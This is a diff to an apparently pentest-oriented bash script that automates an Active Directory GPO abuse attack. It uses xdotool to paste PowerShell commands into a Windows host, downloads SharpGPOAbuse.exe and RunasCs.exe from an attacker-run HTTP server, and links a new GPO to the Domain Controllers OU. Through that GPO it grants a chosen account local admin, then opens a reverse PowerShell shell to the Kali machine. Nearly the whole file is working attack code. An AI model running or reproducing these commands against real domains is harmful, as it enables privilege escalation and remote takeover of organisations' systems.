@@ -4,33 +4,37 @@
 ps: do a GPO abuse
 '
 
-LOCATION="${SCRIPTS_DIR}/windows/activeDirectroy/sharpGPOAbuse/.files"
-FILE="SharpGPOAbuse.exe"
+source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-ps_webclient_upload_file "${LOCATION}" "${FILE}"
-SHARP_GPO_ABUSE_FILE_LOCATION="${FILE_LOCATION}"
+# Generate gui form
+generate_form "HTTP port" "Shell port" "DC"'{"label": "Username", "type": "text", "name": "Username"}'"Password"
 
-FILE="RunasCs.exe"
-ps_webclient_upload_file "${LOCATION}" "${FILE}"
-RUN_AS_FILE_LOCATION="${FILE_LOCATION}"
+HTTP_PORT=${form_data["HTTP port"]}
+SHELL_PORT=${form_data["Shell port"]}
+DC=${form_data["DC"]}
+USERNAME=${form_data["Username"]}
+PASSWORD=${form_data["Password"]}
 
-# Generate GUI form items (label, type (optional: default text), name, default (optional))
-DOMAIN_FIELD=$(form_item  "domain" "domain")
-USERNAME_FIELD=$(form_item  "username" "username")
-PASSWORD_FIELD=$(form_item  "password" "password")
-SHELL_PORT_FIELD=$(form_item  "Shell port" "shell_port")
-DC_FIELD=$(form_item  "DC" "dc")
+cd ${SCRIPTS_DIR}/windows/activeDirectroy/sharpGPOAbuse/.files
+python3 -m http.server ${HTTP_PORT} &
+HTTP_PID=$!
 
-# Generate GUI form
-generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${SHELL_PORT_FIELD}"
-
-DOMAIN=${form_data["domain"]}
-USERNAME=${form_data["username"]}
-PASSWORD=${form_data["password"]}
-SHELL_PORT=${form_data["shell_port"]}
-DC=${form_data["dc"]}
-
+TMP_FOLDER="C:\temp"
 GPO_NAME="doesnotmatter"
+
+paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
+xdotool key Return
+sleep 0.8
+
+paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${HTTP_PORT}/SharpGPOAbuse.exe', '${TMP_FOLDER}\SharpGPOAbuse.exe')"
+xdotool key Return
+sleep 2
+
+paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${HTTP_PORT}/RunasCs.exe', '${TMP_FOLDER}\RunasCs.exe')"
+xdotool key Return
+sleep 2
 
 paste_command "New-GPO -Name \"${GPO_NAME}\""
 xdotool key Return
@@ -40,7 +44,7 @@ paste_command "New-GPLink -Name \"${GPO_NAME}\" -Target \"OU=Domain Controllers,
 xdotool key Return
 sleep 1
 
-paste_command "${SHARP_GPO_ABUSE_FILE_LOCATION} --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
+paste_command "${TMP_FOLDER}\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
 xdotool key Return
 sleep 3
 
@@ -48,5 +52,8 @@ paste_command "gpupdate /force"
 xdotool key Return
 sleep 2
 
-paste_command "${RUN_AS_FILE_LOCATION} "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
+paste_command "${TMP_FOLDER}\RunasCs.exe "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
 xdotool key Return
+
+sleep 60
+kill $HTTP_PID
